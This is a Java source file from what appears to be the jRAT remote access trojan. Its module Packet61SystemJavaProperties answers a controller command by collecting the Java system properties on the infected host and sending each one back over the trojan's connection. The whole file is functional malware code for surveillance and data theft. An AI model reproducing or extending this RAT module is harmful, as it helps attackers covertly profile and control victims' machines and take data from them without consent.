package jrat.module.system.packets;

import jrat.client.Connection;
import jrat.client.packets.incoming.IncomingPacket;

import java.util.Set;


public class Packet61SystemJavaProperties implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Set<Object> keys = System.getProperties().keySet();
		for (Object obj : keys) {
			if (obj.toString().toLowerCase().startsWith("java")) {
				con.addToSendQueue(new Packet44SystemJavaProperty(obj.toString(), System.getProperty(obj.toString())));
			}
		}
	}

}
